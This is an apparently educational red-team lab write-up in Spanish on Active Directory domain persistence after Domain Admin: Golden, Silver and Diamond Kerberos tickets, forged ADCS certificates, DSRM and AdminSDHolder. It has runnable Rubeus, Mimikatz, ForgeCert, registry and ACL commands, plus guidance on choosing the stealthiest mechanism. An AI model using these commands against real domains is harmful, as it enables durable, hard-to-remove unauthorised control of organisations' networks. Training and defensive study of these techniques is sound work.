# Technique — Lab-14 Golden Throne

> **Capability (eje didáctico):** Domain Dominance & Persistence — tickets forjados (Golden/Silver/Diamond), certificados fraudulentos, DSRM, AdminSDHolder. Persistencia que sobrevive a resets de credenciales.
> **Bloque CRTO:** Domain Dominance (el momento en que el operador pasa de "tengo DA" a "tengo el dominio para siempre").
> **Arquetipo:** Operación (A) — kill-chain real. El `execution/` es el plan de ataque.
> **Adversario (escenario):** APT10 / Cloud Hopper — ver [`emulation.md`](emulation.md).

> Tener Domain Admin es temporal. La persistencia de dominio robusta es lo que convierte un acceso en una residencia permanente. Este lab enseña a elegir **qué mecanismo usar según el objetivo, el ruido que genera y lo que detecta el defensor**.

---

## 1. El salto: de DA a "para siempre"

Cuando tienes Domain Admin, el reloj corre: un reset de la cuenta, un cambio de krbtgt, y el acceso se pierde. La persistencia de dominio rompe esa dependencia:

| Mecanismo | Depende de | Sobrevive a |
|-----------|-----------|-------------|
| Golden Ticket | hash de krbtgt | cambios de contraseña de usuarios DA |
| Silver Ticket | hash de cuenta de servicio | cambios de otras cuentas |
| Diamond Ticket | TGT válido + modificación | rotación de krbtgt (en ciertos escenarios) |
| Forged cert (ADCS) | CA privkey | resets de cuentas, cambios de krbtgt |
| DSRM | contraseña de admin local del DC | resets de cuentas de dominio |
| AdminSDHolder | ACL del objeto SDHolder | cambios en ACLs de cuentas protegidas |

## 2. Golden Ticket

**Qué necesitas:** hash NT del krbtgt (se obtiene vía DCSync o volcado del DC).

**Qué obtienes:** un TGT forjado que puedes usar para solicitar cualquier ticket de servicio del dominio — acceso a cualquier recurso como cualquier usuario.

**El truco del doble reset:** Windows cachea el hash anterior de krbtgt. Para invalidar los Golden Tickets existentes, hay que **resetear krbtgt dos veces** con al menos 10 horas entre resets. Un defensor que solo lo resetea una vez no invalida los tickets en circulación.

```
# Forjar con Rubeus (en memoria, con el hash de krbtgt)
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:<domainSID> /rc4:<krbtgt_hash> /ptt

# Con Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /krbtgt:<hash> /ptt
```

## 3. Silver Ticket

**Qué necesitas:** hash NT de la cuenta de servicio del servicio objetivo (no krbtgt).

**Qué obtienes:** un ticket de servicio forjado (TGS) para acceder a un servicio específico *sin pasar por el DC*.

**Ventaja OPSEC:** no genera eventos en el DC (no hay solicitud de TGT ni de TGS real) — más sigiloso que un Golden Ticket para acceso a un servicio puntual.

```
Rubeus.exe silver /service:cifs/server.corp.local /user:Administrator /domain:corp.local /sid:<SID> /rc4:<svc_hash> /ptt
```

## 4. Diamond Ticket

**Qué es:** en vez de forjar un TGT desde cero (Golden), se solicita uno real y se modifica en memoria para añadir grupos privilegiados. Más difícil de detectar porque el TGT tiene estructura válida firmada por el DC.

**Cuándo usarlo:** entornos con detección de Golden Tickets (anomalías en campos del ticket) donde un TGT real-pero-modificado pasa más desapercibido.

```
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:lowpriv /password:... /enctype:aes /ticketuser:Administrator /groups:512 /ptt
```

## 5. Forged Certificates (ADCS)

Si hay una CA de ADCS en el dominio, comprometer su clave privada da **persistencia que sobrevive a cualquier reset de cuenta o de krbtgt** — porque la autenticación por certificado es independiente de Kerberos puro.

```
# Con la CA key comprometida, forjar un cert para cualquier usuario
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword ... --Subject "CN=Administrator" --SubjectAltName "Administrator@corp.local" --NewCertPath admin.pfx

# Usar el cert para obtener TGT
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:... /ptt
```

> Ver Lab-03 (Dark Gate) para los vectores de compromiso de ADCS (ESC1/4/8).

## 6. DSRM — Directory Services Restore Mode

Cada DC tiene una cuenta de administrador local especial (DSRM) con su propia contraseña. Si se obtiene ese hash y se habilita el acceso de red con DSRM:

```
# Extraer hash DSRM (requiere DA en el DC)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName DC01

# Habilitar acceso de red DSRM (una vez en el DC)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Pass-the-Hash con la cuenta DSRM
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<dsrm_hash>
```

**Por qué es persistencia:** la contraseña DSRM raramente se rota, no está vinculada a las cuentas de dominio, y pocos equipos la monitorean.

## 7. AdminSDHolder

AdminSDHolder es un objeto del dominio que define las ACLs que se propagan a los grupos protegidos (DA, EA, etc.) cada hora. Si un operador añade sus permisos al AdminSDHolder, esos permisos **se re-aplican automáticamente** aunque el defensor los elimine de las cuentas protegidas.

```
# Añadir GenericAll sobre AdminSDHolder para una cuenta controlada
Add-ObjectACL -TargetDistinguishedName "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker_account -Rights All
```

## 8. Cuándo usar cada mecanismo

| Situación | Recomendación |
|-----------|---------------|
| Quiero acceso general al dominio duradero | Golden Ticket + krbtgt |
| Quiero acceso a un servicio puntual sin generar ruido en DC | Silver Ticket |
| EDR detecta anomalías en tickets forjados | Diamond Ticket |
| ADCS disponible, quiero persistencia ultra-robusta | Forged cert |
| Quiero backdoor en el DC independiente del dominio | DSRM |
| Quiero que mis permisos se re-apliquen solos | AdminSDHolder |

## 9. MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Persistence / Priv Esc | Forge Kerberos Tickets: Golden | T1558.001 |
| Persistence / Priv Esc | Forge Kerberos Tickets: Silver | T1558.002 |
| Persistence | Modify Authentication Process: DSRM | T1556.004 |
| Persistence | Domain Policy Modification: AdminSDHolder | T1484 |
| Persistence | Steal/Forge Auth Certs | T1649 |

## 10. Key Takeaways

1. **DA es temporal; la persistencia de dominio es permanente.** Elegir el mecanismo correcto convierte el acceso en una residencia.
2. **Cada mecanismo tiene su OPSEC.** Golden = ruidoso pero general; Silver = silencioso pero específico; Diamond = difícil de detectar; Cert = sobrevive a todo.
3. **El doble reset de krbtgt invalida Golden Tickets.** Pero solo si se hace dos veces con intervalo — error frecuente del defensor.
4. **AdminSDHolder re-aplica solo.** El defensor elimina los permisos; AdminSDHolder los restaura cada hora.
5. **DSRM raramente se rota y raramente se monitorea.** Persistencia sigilosa y duradera en entornos sin política específica.

## Referencias

- The Hacker Recipes — Kerberos tickets, ADCS, DSRM, AdminSDHolder
- MITRE ATT&CK — T1558, T1556.004, T1484, T1649
- Rubeus / Mimikatz — documentación de los proyectos
- CRTO — Domain Dominance module

---

*Technique · Lab-14 Golden Throne · Domain Dominance & Persistence (anatomía v3.1, arquetipo operación)*
